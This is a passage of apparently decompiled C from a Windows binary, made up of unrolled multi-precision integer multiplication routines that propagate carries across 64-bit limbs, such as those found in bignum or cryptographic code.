  v249 = *((_QWORD *)&v247 + 1) + v245;
  v250 = (v249 < *((_QWORD *)&v247 + 1)) + v246;
  v251 = v590[6] * (unsigned __int128)v591[12];
  v252 = v248 + v251;
  *((_QWORD *)&v251 + 1) += v248 + (unsigned __int64)v251 < v248;
  v253 = *((_QWORD *)&v251 + 1) + v249;
  v254 = (v253 < *((_QWORD *)&v251 + 1)) + v250;
  v255 = v590[7] * (unsigned __int128)v591[11];
  v256 = v252 + v255;
  *((_QWORD *)&v255 + 1) += v252 + (unsigned __int64)v255 < v252;
  v257 = *((_QWORD *)&v255 + 1) + v253;
  v258 = (v257 < *((_QWORD *)&v255 + 1)) + v254;
  v259 = v590[8] * (unsigned __int128)v591[10];
  v260 = v256 + v259;
  *((_QWORD *)&v259 + 1) += v256 + (unsigned __int64)v259 < v256;
  v261 = *((_QWORD *)&v259 + 1) + v257;
  v262 = (v261 < *((_QWORD *)&v259 + 1)) + v258;
  v263 = v590[9] * (unsigned __int128)v591[9];
  v264 = v260 + v263;
  *((_QWORD *)&v263 + 1) += v260 + (unsigned __int64)v263 < v260;
  v265 = *((_QWORD *)&v263 + 1) + v261;
  v266 = (v265 < *((_QWORD *)&v263 + 1)) + v262;
  v267 = v590[10] * (unsigned __int128)v591[8];
  v268 = v264 + v267;
  *((_QWORD *)&v267 + 1) += v264 + (unsigned __int64)v267 < v264;
  v269 = *((_QWORD *)&v267 + 1) + v265;
  v270 = (v269 < *((_QWORD *)&v267 + 1)) + v266;
  v271 = v590[11] * (unsigned __int128)v591[7];
  v272 = v268 + v271;
  *((_QWORD *)&v271 + 1) += v268 + (unsigned __int64)v271 < v268;
  v273 = *((_QWORD *)&v271 + 1) + v269;
  v274 = (v273 < *((_QWORD *)&v271 + 1)) + v270;
  v275 = v590[12] * (unsigned __int128)v591[6];
  v276 = v272 + v275;
  *((_QWORD *)&v275 + 1) += v272 + (unsigned __int64)v275 < v272;
  v277 = *((_QWORD *)&v275 + 1) + v273;
  v278 = (v277 < *((_QWORD *)&v275 + 1)) + v274;
  v279 = v590[13] * (unsigned __int128)v591[5];
  v280 = v276 + v279;
  *((_QWORD *)&v279 + 1) += v276 + (unsigned __int64)v279 < v276;
  v281 = *((_QWORD *)&v279 + 1) + v277;
  v282 = (v281 < *((_QWORD *)&v279 + 1)) + v278;
  v283 = v590[14] * (unsigned __int128)v591[4];
  v284 = v280 + v283;
  *((_QWORD *)&v283 + 1) += v280 + (unsigned __int64)v283 < v280;
  v285 = *((_QWORD *)&v283 + 1) + v281;
  v286 = (v285 < *((_QWORD *)&v283 + 1)) + v282;
  v287 = v590[15] * (unsigned __int128)v591[3];
  *(_QWORD *)&v287 = v284 + v287;
  *((_QWORD *)&v287 + 1) += (unsigned __int64)v287 < v284;
  v589[2] = v287;
  v288 = *((_QWORD *)&v287 + 1) + v285;
  v289 = (v288 < *((_QWORD *)&v287 + 1)) + v286;
  v290 = v590[4] * (unsigned __int128)v591[15];
  v291 = v288 + v290;
  *((_QWORD *)&v290 + 1) += v288 + (unsigned __int64)v290 < v288;
  v292 = *((_QWORD *)&v290 + 1) + v289;
  v293 = v292 < *((_QWORD *)&v290 + 1);
  v294 = v590[5] * (unsigned __int128)v591[14];
  v295 = v291 + v294;
  *((_QWORD *)&v294 + 1) += v291 + (unsigned __int64)v294 < v291;
  v296 = *((_QWORD *)&v294 + 1) + v292;
  v297 = (v296 < *((_QWORD *)&v294 + 1)) + v293;
  v298 = v590[6] * (unsigned __int128)v591[13];
  v299 = v295 + v298;
  *((_QWORD *)&v298 + 1) += v295 + (unsigned __int64)v298 < v295;
  v300 = *((_QWORD *)&v298 + 1) + v296;
  v301 = (v300 < *((_QWORD *)&v298 + 1)) + v297;
  v302 = v590[7] * (unsigned __int128)v591[12];
  v303 = v299 + v302;
  *((_QWORD *)&v302 + 1) += v299 + (unsigned __int64)v302 < v299;
  v304 = *((_QWORD *)&v302 + 1) + v300;
  v305 = (v304 < *((_QWORD *)&v302 + 1)) + v301;
  v306 = v590[8] * (unsigned __int128)v591[11];
  v307 = v303 + v306;
  *((_QWORD *)&v306 + 1) += v303 + (unsigned __int64)v306 < v303;
  v308 = *((_QWORD *)&v306 + 1) + v304;
  v309 = (v308 < *((_QWORD *)&v306 + 1)) + v305;
  v310 = v590[9] * (unsigned __int128)v591[10];
  v311 = v307 + v310;
  *((_QWORD *)&v310 + 1) += v307 + (unsigned __int64)v310 < v307;
  v312 = *((_QWORD *)&v310 + 1) + v308;
  v313 = (v312 < *((_QWORD *)&v310 + 1)) + v309;
  v314 = v590[10] * (unsigned __int128)v591[9];
  v315 = v311 + v314;
  *((_QWORD *)&v314 + 1) += v311 + (unsigned __int64)v314 < v311;
  v316 = *((_QWORD *)&v314 + 1) + v312;
  v317 = (v316 < *((_QWORD *)&v314 + 1)) + v313;
  v318 = v590[11] * (unsigned __int128)v591[8];
  v319 = v315 + v318;
  *((_QWORD *)&v318 + 1) += v315 + (unsigned __int64)v318 < v315;
  v320 = *((_QWORD *)&v318 + 1) + v316;
  v321 = (v320 < *((_QWORD *)&v318 + 1)) + v317;
  v322 = v590[12] * (unsigned __int128)v591[7];
  v323 = v319 + v322;
  *((_QWORD *)&v322 + 1) += v319 + (unsigned __int64)v322 < v319;
  v324 = *((_QWORD *)&v322 + 1) + v320;
  v325 = (v324 < *((_QWORD *)&v322 + 1)) + v321;
  v326 = v590[13] * (unsigned __int128)v591[6];
  v327 = v323 + v326;
  *((_QWORD *)&v326 + 1) += v323 + (unsigned __int64)v326 < v323;
  v328 = *((_QWORD *)&v326 + 1) + v324;
  v329 = (v328 < *((_QWORD *)&v326 + 1)) + v325;
  v330 = v590[14] * (unsigned __int128)v591[5];
  v331 = v327 + v330;
  *((_QWORD *)&v330 + 1) += v327 + (unsigned __int64)v330 < v327;
  v332 = *((_QWORD *)&v330 + 1) + v328;
  v333 = (v332 < *((_QWORD *)&v330 + 1)) + v329;
  v334 = v590[15] * (unsigned __int128)v591[4];
  *(_QWORD *)&v334 = v331 + v334;
  v589[3] = v334;
  *((_QWORD *)&v334 + 1) += (unsigned __int64)v334 < v331;
  v335 = *((_QWORD *)&v334 + 1) + v332;
  v336 = (v335 < *((_QWORD *)&v334 + 1)) + v333;
  v337 = v590[5] * (unsigned __int128)v591[15];
  v338 = v335 + v337;
  *((_QWORD *)&v337 + 1) += v335 + (unsigned __int64)v337 < v335;
  v339 = *((_QWORD *)&v337 + 1) + v336;
  v340 = v339 < *((_QWORD *)&v337 + 1);
  v341 = v590[6] * (unsigned __int128)v591[14];
  v342 = v338 + v341;
  *((_QWORD *)&v341 + 1) += v338 + (unsigned __int64)v341 < v338;
  v343 = *((_QWORD *)&v341 + 1) + v339;
  v344 = (v343 < *((_QWORD *)&v341 + 1)) + v340;
  v345 = v590[7] * (unsigned __int128)v591[13];
  v346 = v342 + v345;
  *((_QWORD *)&v345 + 1) += v342 + (unsigned __int64)v345 < v342;
  v347 = *((_QWORD *)&v345 + 1) + v343;
  v348 = (v347 < *((_QWORD *)&v345 + 1)) + v344;
  v349 = v590[8] * (unsigned __int128)v591[12];
  v350 = v346 + v349;
  *((_QWORD *)&v349 + 1) += v346 + (unsigned __int64)v349 < v346;
  v351 = *((_QWORD *)&v349 + 1) + v347;
  v352 = (v351 < *((_QWORD *)&v349 + 1)) + v348;
  v353 = v590[9] * (unsigned __int128)v591[11];
  v354 = v350 + v353;
  *((_QWORD *)&v353 + 1) += v350 + (unsigned __int64)v353 < v350;
  v355 = *((_QWORD *)&v353 + 1) + v351;
  v356 = (v355 < *((_QWORD *)&v353 + 1)) + v352;
  v357 = v590[10] * (unsigned __int128)v591[10];
  v358 = v354 + v357;
  *((_QWORD *)&v357 + 1) += v354 + (unsigned __int64)v357 < v354;
  v359 = *((_QWORD *)&v357 + 1) + v355;
  v360 = (v359 < *((_QWORD *)&v357 + 1)) + v356;
  v361 = v590[11] * (unsigned __int128)v591[9];
  v362 = v358 + v361;
  *((_QWORD *)&v361 + 1) += v358 + (unsigned __int64)v361 < v358;
  v363 = *((_QWORD *)&v361 + 1) + v359;
  v364 = (v363 < *((_QWORD *)&v361 + 1)) + v360;
  v365 = v590[12] * (unsigned __int128)v591[8];
  v366 = v362 + v365;
  *((_QWORD *)&v365 + 1) += v362 + (unsigned __int64)v365 < v362;
  v367 = *((_QWORD *)&v365 + 1) + v363;
  v368 = (v367 < *((_QWORD *)&v365 + 1)) + v364;
  v369 = v590[13] * (unsigned __int128)v591[7];
  v370 = v366 + v369;
  *((_QWORD *)&v369 + 1) += v366 + (unsigned __int64)v369 < v366;
  v371 = *((_QWORD *)&v369 + 1) + v367;
  v372 = (v371 < *((_QWORD *)&v369 + 1)) + v368;
  v373 = v590[14] * (unsigned __int128)v591[6];
  v374 = v370 + v373;
  *((_QWORD *)&v373 + 1) += v370 + (unsigned __int64)v373 < v370;
  v375 = *((_QWORD *)&v373 + 1) + v371;
  v376 = (v375 < *((_QWORD *)&v373 + 1)) + v372;
  v377 = v590[15] * (unsigned __int128)v591[5];
  *(_QWORD *)&v377 = v374 + v377;
  v589[4] = v377;
  *((_QWORD *)&v377 + 1) += (unsigned __int64)v377 < v374;
  v378 = *((_QWORD *)&v377 + 1) + v375;
  v379 = (v378 < *((_QWORD *)&v377 + 1)) + v376;
  v380 = v590[6] * (unsigned __int128)v591[15];
  v381 = v378 + v380;
  *((_QWORD *)&v380 + 1) += v378 + (unsigned __int64)v380 < v378;
  v382 = *((_QWORD *)&v380 + 1) + v379;
  v383 = v382 < *((_QWORD *)&v380 + 1);
  v384 = v590[7] * (unsigned __int128)v591[14];
  v385 = v381 + v384;
  *((_QWORD *)&v384 + 1) += v381 + (unsigned __int64)v384 < v381;
  v386 = *((_QWORD *)&v384 + 1) + v382;
  v387 = (v386 < *((_QWORD *)&v384 + 1)) + v383;
  v388 = v590[8] * (unsigned __int128)v591[13];
  v389 = v385 + v388;
  *((_QWORD *)&v388 + 1) += v385 + (unsigned __int64)v388 < v385;
  v390 = *((_QWORD *)&v388 + 1) + v386;
  v391 = (v390 < *((_QWORD *)&v388 + 1)) + v387;
  v392 = v590[9] * (unsigned __int128)v591[12];
  v393 = v389 + v392;
  *((_QWORD *)&v392 + 1) += v389 + (unsigned __int64)v392 < v389;
  v394 = *((_QWORD *)&v392 + 1) + v390;
  v395 = (v394 < *((_QWORD *)&v392 + 1)) + v391;
  v396 = v590[10] * (unsigned __int128)v591[11];
  v397 = v393 + v396;
  *((_QWORD *)&v396 + 1) += v393 + (unsigned __int64)v396 < v393;
  v398 = *((_QWORD *)&v396 + 1) + v394;
  v399 = (v398 < *((_QWORD *)&v396 + 1)) + v395;
  v400 = v590[11] * (unsigned __int128)v591[10];
  v401 = v397 + v400;
  *((_QWORD *)&v400 + 1) += v397 + (unsigned __int64)v400 < v397;
  v402 = *((_QWORD *)&v400 + 1) + v398;
  v403 = (v402 < *((_QWORD *)&v400 + 1)) + v399;
  v404 = v590[12] * (unsigned __int128)v591[9];
  v405 = v401 + v404;
  *((_QWORD *)&v404 + 1) += v401 + (unsigned __int64)v404 < v401;
  v406 = *((_QWORD *)&v404 + 1) + v402;
  v407 = (v406 < *((_QWORD *)&v404 + 1)) + v403;
  v408 = v590[13] * (unsigned __int128)v591[8];
  v409 = v405 + v408;
  *((_QWORD *)&v408 + 1) += v405 + (unsigned __int64)v408 < v405;
  v410 = *((_QWORD *)&v408 + 1) + v406;
  v411 = (v410 < *((_QWORD *)&v408 + 1)) + v407;
  v412 = v590[14] * (unsigned __int128)v591[7];
  v413 = v409 + v412;
  *((_QWORD *)&v412 + 1) += v409 + (unsigned __int64)v412 < v409;
  v414 = *((_QWORD *)&v412 + 1) + v410;
  v415 = (v414 < *((_QWORD *)&v412 + 1)) + v411;
  v416 = v590[15] * (unsigned __int128)v591[6];
  *(_QWORD *)&v416 = v413 + v416;
  v589[5] = v416;
  *((_QWORD *)&v416 + 1) += (unsigned __int64)v416 < v413;
  v417 = *((_QWORD *)&v416 + 1) + v414;
  v418 = (v417 < *((_QWORD *)&v416 + 1)) + v415;
  v419 = v590[7] * (unsigned __int128)v591[15];
  v420 = v417 + v419;
  *((_QWORD *)&v419 + 1) += v417 + (unsigned __int64)v419 < v417;
  v421 = *((_QWORD *)&v419 + 1) + v418;
  v422 = v421 < *((_QWORD *)&v419 + 1);
  v423 = v590[8] * (unsigned __int128)v591[14];
  v424 = v420 + v423;
  *((_QWORD *)&v423 + 1) += v420 + (unsigned __int64)v423 < v420;
  v425 = *((_QWORD *)&v423 + 1) + v421;
  v426 = (v425 < *((_QWORD *)&v423 + 1)) + v422;
  v427 = v590[9] * (unsigned __int128)v591[13];
  v428 = v424 + v427;
  *((_QWORD *)&v427 + 1) += v424 + (unsigned __int64)v427 < v424;
  v429 = *((_QWORD *)&v427 + 1) + v425;
  v430 = (v429 < *((_QWORD *)&v427 + 1)) + v426;
  v431 = v590[10] * (unsigned __int128)v591[12];
  v432 = v428 + v431;
  *((_QWORD *)&v431 + 1) += v428 + (unsigned __int64)v431 < v428;
  v433 = *((_QWORD *)&v431 + 1) + v429;
  v434 = (v433 < *((_QWORD *)&v431 + 1)) + v430;
  v435 = v590[11] * (unsigned __int128)v591[11];
  v436 = v432 + v435;
  *((_QWORD *)&v435 + 1) += v432 + (unsigned __int64)v435 < v432;
  v437 = *((_QWORD *)&v435 + 1) + v433;
  v438 = (v437 < *((_QWORD *)&v435 + 1)) + v434;
  v439 = v590[12] * (unsigned __int128)v591[10];
  v440 = v436 + v439;
  *((_QWORD *)&v439 + 1) += v436 + (unsigned __int64)v439 < v436;
  v441 = *((_QWORD *)&v439 + 1) + v437;
  v442 = (v441 < *((_QWORD *)&v439 + 1)) + v438;
  v443 = v590[13] * (unsigned __int128)v591[9];
  v444 = v440 + v443;
  *((_QWORD *)&v443 + 1) += v440 + (unsigned __int64)v443 < v440;
  v445 = *((_QWORD *)&v443 + 1) + v441;
  v446 = (v445 < *((_QWORD *)&v443 + 1)) + v442;
  v447 = v590[14] * (unsigned __int128)v591[8];
  v448 = v444 + v447;
  *((_QWORD *)&v447 + 1) += v444 + (unsigned __int64)v447 < v444;
  v449 = *((_QWORD *)&v447 + 1) + v445;
  v450 = (v449 < *((_QWORD *)&v447 + 1)) + v446;
  v451 = v590[15] * (unsigned __int128)v591[7];
  *(_QWORD *)&v451 = v448 + v451;
  v589[6] = v451;
  *((_QWORD *)&v451 + 1) += (unsigned __int64)v451 < v448;
  v452 = *((_QWORD *)&v451 + 1) + v449;
  v453 = (v452 < *((_QWORD *)&v451 + 1)) + v450;
  v454 = v590[8] * (unsigned __int128)v591[15];
  v455 = v452 + v454;
  *((_QWORD *)&v454 + 1) += v452 + (unsigned __int64)v454 < v452;
  v456 = *((_QWORD *)&v454 + 1) + v453;
  v457 = v456 < *((_QWORD *)&v454 + 1);
  v458 = v590[9] * (unsigned __int128)v591[14];
  v459 = v455 + v458;
  *((_QWORD *)&v458 + 1) += v455 + (unsigned __int64)v458 < v455;
  v460 = *((_QWORD *)&v458 + 1) + v456;
  v461 = (v460 < *((_QWORD *)&v458 + 1)) + v457;
  v462 = v590[10] * (unsigned __int128)v591[13];
  v463 = v459 + v462;
  *((_QWORD *)&v462 + 1) += v459 + (unsigned __int64)v462 < v459;
  v464 = *((_QWORD *)&v462 + 1) + v460;
  v465 = (v464 < *((_QWORD *)&v462 + 1)) + v461;
  v466 = v590[11] * (unsigned __int128)v591[12];
  v467 = v463 + v466;
  *((_QWORD *)&v466 + 1) += v463 + (unsigned __int64)v466 < v463;
  v468 = *((_QWORD *)&v466 + 1) + v464;
  v469 = (v468 < *((_QWORD *)&v466 + 1)) + v465;
  v470 = v590[12] * (unsigned __int128)v591[11];
  v471 = v467 + v470;
  *((_QWORD *)&v470 + 1) += v467 + (unsigned __int64)v470 < v467;
  v472 = *((_QWORD *)&v470 + 1) + v468;
  v473 = (v472 < *((_QWORD *)&v470 + 1)) + v469;
  v474 = v590[13] * (unsigned __int128)v591[10];
  v475 = v471 + v474;
  *((_QWORD *)&v474 + 1) += v471 + (unsigned __int64)v474 < v471;
  v476 = *((_QWORD *)&v474 + 1) + v472;
  v477 = (v476 < *((_QWORD *)&v474 + 1)) + v473;
  v478 = v590[14] * (unsigned __int128)v591[9];
  v479 = v475 + v478;
  *((_QWORD *)&v478 + 1) += v475 + (unsigned __int64)v478 < v475;
  v480 = *((_QWORD *)&v478 + 1) + v476;
  v481 = (v480 < *((_QWORD *)&v478 + 1)) + v477;
  v482 = v590[15] * (unsigned __int128)v591[8];
  *(_QWORD *)&v482 = v479 + v482;
  v589[7] = v482;
  *((_QWORD *)&v482 + 1) += (unsigned __int64)v482 < v479;
  v483 = *((_QWORD *)&v482 + 1) + v480;
  v484 = (v483 < *((_QWORD *)&v482 + 1)) + v481;
  v485 = v590[9] * (unsigned __int128)v591[15];
  v486 = v483 + v485;
  *((_QWORD *)&v485 + 1) += v483 + (unsigned __int64)v485 < v483;
  v487 = *((_QWORD *)&v485 + 1) + v484;
  v488 = v487 < *((_QWORD *)&v485 + 1);
  v489 = v590[10] * (unsigned __int128)v591[14];
  v490 = v486 + v489;
  *((_QWORD *)&v489 + 1) += v486 + (unsigned __int64)v489 < v486;
  v491 = *((_QWORD *)&v489 + 1) + v487;
  v492 = (v491 < *((_QWORD *)&v489 + 1)) + v488;
  v493 = v590[11] * (unsigned __int128)v591[13];
  v494 = v490 + v493;
  *((_QWORD *)&v493 + 1) += v490 + (unsigned __int64)v493 < v490;
  v495 = *((_QWORD *)&v493 + 1) + v491;
  v496 = (v495 < *((_QWORD *)&v493 + 1)) + v492;
  v497 = v590[12] * (unsigned __int128)v591[12];
  v498 = v494 + v497;
  *((_QWORD *)&v497 + 1) += v494 + (unsigned __int64)v497 < v494;
  v499 = *((_QWORD *)&v497 + 1) + v495;
  v500 = (v499 < *((_QWORD *)&v497 + 1)) + v496;
  v501 = v590[13] * (unsigned __int128)v591[11];
  v502 = v498 + v501;
  *((_QWORD *)&v501 + 1) += v498 + (unsigned __int64)v501 < v498;
  v503 = *((_QWORD *)&v501 + 1) + v499;
  v504 = (v503 < *((_QWORD *)&v501 + 1)) + v500;
  v505 = v590[14] * (unsigned __int128)v591[10];
  v506 = v502 + v505;
  *((_QWORD *)&v505 + 1) += v502 + (unsigned __int64)v505 < v502;
  v507 = *((_QWORD *)&v505 + 1) + v503;
  v508 = (v507 < *((_QWORD *)&v505 + 1)) + v504;
  v509 = v590[15] * (unsigned __int128)v591[9];
  *(_QWORD *)&v509 = v506 + v509;
  v589[8] = v509;
  *((_QWORD *)&v509 + 1) += (unsigned __int64)v509 < v506;
  v510 = *((_QWORD *)&v509 + 1) + v507;
  v511 = (v510 < *((_QWORD *)&v509 + 1)) + v508;
  v512 = v590[10] * (unsigned __int128)v591[15];
  v513 = v510 + v512;
  *((_QWORD *)&v512 + 1) += v510 + (unsigned __int64)v512 < v510;
  v514 = *((_QWORD *)&v512 + 1) + v511;
  v515 = v514 < *((_QWORD *)&v512 + 1);
  v516 = v590[11] * (unsigned __int128)v591[14];
  v517 = v513 + v516;
  *((_QWORD *)&v516 + 1) += v513 + (unsigned __int64)v516 < v513;
  v518 = *((_QWORD *)&v516 + 1) + v514;
  v519 = (v518 < *((_QWORD *)&v516 + 1)) + v515;
  v520 = v590[12] * (unsigned __int128)v591[13];
  v521 = v517 + v520;
  *((_QWORD *)&v520 + 1) += v517 + (unsigned __int64)v520 < v517;
  v522 = *((_QWORD *)&v520 + 1) + v518;
  v523 = (v522 < *((_QWORD *)&v520 + 1)) + v519;
  v524 = v590[13] * (unsigned __int128)v591[12];
  v525 = v521 + v524;
  *((_QWORD *)&v524 + 1) += v521 + (unsigned __int64)v524 < v521;
  v526 = *((_QWORD *)&v524 + 1) + v522;
  v527 = (v526 < *((_QWORD *)&v524 + 1)) + v523;
  v528 = v590[14] * (unsigned __int128)v591[11];
  v529 = v525 + v528;
  *((_QWORD *)&v528 + 1) += v525 + (unsigned __int64)v528 < v525;
  v530 = *((_QWORD *)&v528 + 1) + v526;
  v531 = (v530 < *((_QWORD *)&v528 + 1)) + v527;
  v532 = v590[15] * (unsigned __int128)v591[10];
  *(_QWORD *)&v532 = v529 + v532;
  v589[9] = v532;
  *((_QWORD *)&v532 + 1) += (unsigned __int64)v532 < v529;
  v533 = *((_QWORD *)&v532 + 1) + v530;
  v534 = (v533 < *((_QWORD *)&v532 + 1)) + v531;
  v535 = v590[11] * (unsigned __int128)v591[15];
  v536 = v533 + v535;
  *((_QWORD *)&v535 + 1) += v533 + (unsigned __int64)v535 < v533;
  v537 = *((_QWORD *)&v535 + 1) + v534;
  v538 = v537 < *((_QWORD *)&v535 + 1);
  v539 = v590[12] * (unsigned __int128)v591[14];
  v540 = v536 + v539;
  *((_QWORD *)&v539 + 1) += v536 + (unsigned __int64)v539 < v536;
  v541 = *((_QWORD *)&v539 + 1) + v537;
  v542 = (v541 < *((_QWORD *)&v539 + 1)) + v538;
  v543 = v590[13] * (unsigned __int128)v591[13];
  v544 = v540 + v543;
  *((_QWORD *)&v543 + 1) += v540 + (unsigned __int64)v543 < v540;
  v545 = *((_QWORD *)&v543 + 1) + v541;
  v546 = (v545 < *((_QWORD *)&v543 + 1)) + v542;
  v547 = v590[14] * (unsigned __int128)v591[12];
  v548 = v544 + v547;
  *((_QWORD *)&v547 + 1) += v544 + (unsigned __int64)v547 < v544;
  v549 = *((_QWORD *)&v547 + 1) + v545;
  v550 = (v549 < *((_QWORD *)&v547 + 1)) + v546;
  v551 = v590[15] * (unsigned __int128)v591[11];
  *(_QWORD *)&v551 = v548 + v551;
  v589[10] = v551;
  *((_QWORD *)&v551 + 1) += (unsigned __int64)v551 < v548;
  v552 = *((_QWORD *)&v551 + 1) + v549;
  v553 = (v552 < *((_QWORD *)&v551 + 1)) + v550;
  v554 = v590[12] * (unsigned __int128)v591[15];
  v555 = v552 + v554;
  *((_QWORD *)&v554 + 1) += v552 + (unsigned __int64)v554 < v552;
  v556 = *((_QWORD *)&v554 + 1) + v553;
  v557 = v556 < *((_QWORD *)&v554 + 1);
  v558 = v590[13] * (unsigned __int128)v591[14];
  v559 = v555 + v558;
  *((_QWORD *)&v558 + 1) += v555 + (unsigned __int64)v558 < v555;
  v560 = *((_QWORD *)&v558 + 1) + v556;
  v561 = (v560 < *((_QWORD *)&v558 + 1)) + v557;
  v562 = v590[14] * (unsigned __int128)v591[13];
  v563 = v559 + v562;
  *((_QWORD *)&v562 + 1) += v559 + (unsigned __int64)v562 < v559;
  v564 = *((_QWORD *)&v562 + 1) + v560;
  v565 = (v564 < *((_QWORD *)&v562 + 1)) + v561;
  v566 = v590[15] * (unsigned __int128)v591[12];
  *(_QWORD *)&v566 = v563 + v566;
  v589[11] = v566;
  *((_QWORD *)&v566 + 1) += (unsigned __int64)v566 < v563;
  v567 = *((_QWORD *)&v566 + 1) + v564;
  v568 = (v567 < *((_QWORD *)&v566 + 1)) + v565;
  v569 = v590[13] * (unsigned __int128)v591[15];
  v570 = v567 + v569;
  *((_QWORD *)&v569 + 1) += v567 + (unsigned __int64)v569 < v567;
  v571 = *((_QWORD *)&v569 + 1) + v568;
  v572 = v571 < *((_QWORD *)&v569 + 1);
  v573 = v590[14] * (unsigned __int128)v591[14];
  v574 = v570 + v573;
  *((_QWORD *)&v573 + 1) += v570 + (unsigned __int64)v573 < v570;
  v575 = *((_QWORD *)&v573 + 1) + v571;
  v576 = (v575 < *((_QWORD *)&v573 + 1)) + v572;
  v577 = v590[15] * (unsigned __int128)v591[13];
  *(_QWORD *)&v577 = v574 + v577;
  v589[12] = v577;
  *((_QWORD *)&v577 + 1) += (unsigned __int64)v577 < v574;
  v578 = *((_QWORD *)&v577 + 1) + v575;
  v579 = (v578 < *((_QWORD *)&v577 + 1)) + v576;
  v580 = v590[14] * (unsigned __int128)v591[15];
  v581 = v578 + v580;
  *((_QWORD *)&v580 + 1) += v578 + (unsigned __int64)v580 < v578;
  v582 = *((_QWORD *)&v580 + 1) + v579;
  v583 = v582 < *((_QWORD *)&v580 + 1);
  v584 = v590[15] * (unsigned __int128)v591[14];
  *(_QWORD *)&v584 = v581 + v584;
  v589[13] = v584;
  *((_QWORD *)&v584 + 1) += (unsigned __int64)v584 < v581;
  v585 = *((_QWORD *)&v584 + 1) + v582;
  v586 = (v585 < *((_QWORD *)&v584 + 1)) + v583;
  v587 = v590[15] * (unsigned __int128)v591[15];
  result = v585 + v587;
  v589[14] = result;
  v589[15] = v586 + (result < v585) + *((_QWORD *)&v587 + 1);
  return result;
}

//----- (0000000140043360) ----------------------------------------------------
unsigned __int64 __fastcall sub_140043360(unsigned __int64 *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  unsigned __int64 v3; // rdi
  unsigned __int64 v4; // r11
  unsigned __int64 *v5; // rbx
  unsigned __int64 *v6; // r14
  unsigned __int64 v7; // r10
  unsigned __int128 v8; // ax
  unsigned __int64 v9; // r8
  __int64 v10; // rsi
  unsigned __int128 v11; // ax
  unsigned __int64 v12; // rsi
  _BOOL8 v13; // rcx
  unsigned __int128 v14; // ax
  unsigned __int64 result; // rax

  v3 = a3[1];
  v4 = *a3;
  v5 = a2;
  v6 = a1;
  v7 = *a2 * (unsigned __int128)*a3 >> 64;
  v8 = *a2 * (unsigned __int128)a3[1];
  v9 = v7 + v8;
  v10 = (v7 + (unsigned __int64)v8 < v7) + *((_QWORD *)&v8 + 1);
  v11 = v5[1] * (unsigned __int128)v4;
  *((_QWORD *)&v11 + 1) += v9 + (unsigned __int64)v11 < v9;
  v12 = *((_QWORD *)&v11 + 1) + v10;
  v13 = v12 < *((_QWORD *)&v11 + 1);
  v14 = v5[1] * (unsigned __int128)v3;
  result = v12 + v14;
  *v6 = result;
  v6[1] = v13 + (result < v12) + *((_QWORD *)&v14 + 1);
  return result;
}

//----- (00000001400433F0) ----------------------------------------------------
unsigned __int64 __fastcall sub_1400433F0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // r12
  unsigned __int64 v5; // r13
  unsigned __int64 v6; // r10
  unsigned __int64 v7; // r15
  unsigned __int64 *v8; // r9
  unsigned __int64 v9; // rbp
  unsigned __int64 v10; // r14
  unsigned __int64 v11; // rbx
  unsigned __int64 v12; // rdi
  __int64 v13; // r11
  unsigned __int64 v14; // rdx
  unsigned __int64 v15; // r11
  _BOOL8 v16; // rsi
  unsigned __int64 v17; // rdx
  unsigned __int64 v18; // r11
  _BOOL8 v19; // rsi
  unsigned __int128 v20; // ax
  unsigned __int64 v21; // rcx
  unsigned __int64 v22; // rsi
  _BOOL8 v23; // r11
  unsigned __int128 v24; // ax
  unsigned __int64 v25; // r8
  unsigned __int64 v26; // rsi
  _BOOL8 v27; // r11
  unsigned __int128 v28; // ax
  unsigned __int64 v29; // r9
  unsigned __int64 v30; // rsi
  _BOOL8 v31; // r11
  unsigned __int128 v32; // ax
  unsigned __int64 v33; // rsi
  _BOOL8 v34; // r11
  unsigned __int64 v35; // rsi
  bool v36; // cf
  unsigned __int128 v37; // ax
  unsigned __int64 v38; // rcx
  unsigned __int64 v39; // r9
  _BOOL8 v40; // r11
  unsigned __int128 v41; // ax
  unsigned __int64 v42; // r8
  unsigned __int64 v43; // r9
  _BOOL8 v44; // r11
  unsigned __int128 v45; // ax
  unsigned __int64 v46; // r9
  _BOOL8 v47; // r11
  unsigned __int128 v48; // ax
  unsigned __int64 v49; // rcx
  unsigned __int64 v50; // r11
  _BOOL8 v51; // rbx
  unsigned __int128 v52; // ax
  unsigned __int64 v53; // r11
  _BOOL8 v54; // rbx
  unsigned __int128 v55; // ax
  unsigned __int64 result; // rax
  _QWORD *v57; // [rsp+40h] [rbp+8h]
  unsigned __int64 *v58; // [rsp+48h] [rbp+10h]
  unsigned __int64 *v59; // [rsp+50h] [rbp+18h]

  v59 = a3;
  v58 = a2;
  v57 = a1;
  v4 = a3[2];
  v5 = a3[1];
  v6 = a2[3];
  v7 = a4;
  v8 = a2;
  v9 = a2[1];
  v10 = a2[2];
  v11 = *a3;
  v12 = a3[3];
  v13 = *a2 * (unsigned __int128)v4 >> 64;
  v14 = v9 * (unsigned __int128)v5 >> 64;
  v15 = v14 + v13;
  v16 = v15 < v14;
  v17 = v10 * (unsigned __int128)*a3 >> 64;
  v18 = v17 + v15;
  v19 = (v18 < v17) + v16;
  v20 = *v8 * (unsigned __int128)v12;
  v21 = v18 + v20;
  *((_QWORD *)&v20 + 1) += v18 + (unsigned __int64)v20 < v18;
  v22 = *((_QWORD *)&v20 + 1) + v19;
  v23 = v22 < *((_QWORD *)&v20 + 1);
  v24 = v9 * (unsigned __int128)v4;
  v25 = v21 + v24;
  *((_QWORD *)&v24 + 1) += v21 + (unsigned __int64)v24 < v21;
  v26 = *((_QWORD *)&v24 + 1) + v22;
  v27 = (v26 < *((_QWORD *)&v24 + 1)) + v23;
  v28 = v10 * (unsigned __int128)v5;
  v29 = v25 + v28;
  *((_QWORD *)&v28 + 1) += v25 + (unsigned __int64)v28 < v25;
  v30 = *((_QWORD *)&v28 + 1) + v26;
  v31 = (v30 < *((_QWORD *)&v28 + 1)) + v27;
  v32 = v6 * (unsigned __int128)v11;
  *((_QWORD *)&v32 + 1) += v29 + (unsigned __int64)v32 < v29;
  v33 = *((_QWORD *)&v32 + 1) + v30;
  v34 = (v33 < *((_QWORD *)&v32 + 1)) + v31;
  v35 = (v7 < v29 + (unsigned __int64)v32) + v33;
  v36 = __PAIR__(v35, v7) < v29 + (unsigned __int64)v32;
  v37 = v9 * (unsigned __int128)v12;
  v38 = v35 + v37;
  *((_QWORD *)&v37 + 1) += v35 + (unsigned __int64)v37 < v35;
